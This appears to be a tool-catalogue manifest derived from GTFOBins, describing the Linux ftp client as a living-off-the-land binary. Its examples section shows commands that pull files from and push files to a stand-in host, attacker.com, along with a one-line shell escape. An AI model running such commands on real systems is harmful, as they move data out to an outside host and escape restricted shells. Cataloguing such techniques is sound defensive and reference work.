---
id: network-ftp-ftp
namespace: network:ftp:ftp
name: ftp
description: File Transfer Protocol client; can transfer files and spawn shells Can also download files, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- ftp
parameters: []
features: []
execution:
  template: ftp
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: 'ftp -a attacker.com

    get /path/to/input-file output-file'
- description: Spawn an interactive shell
  command: 'ftp

    !/bin/sh'
- description: Upload files
  command: 'ftp -a attacker.com

    put /path/to/input-file output-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/ftp/
techniques:
- collection
- privilege-escalation
- execution
- exfiltration
install:
- method: apt
  package_name: ftp
  commands:
  - apt-get install -y ftp
---


# ftp

ftp is a command-line utility. File Transfer Protocol client; can transfer files and spawn shells Can also download files, spawn an interactive shell, upload files.
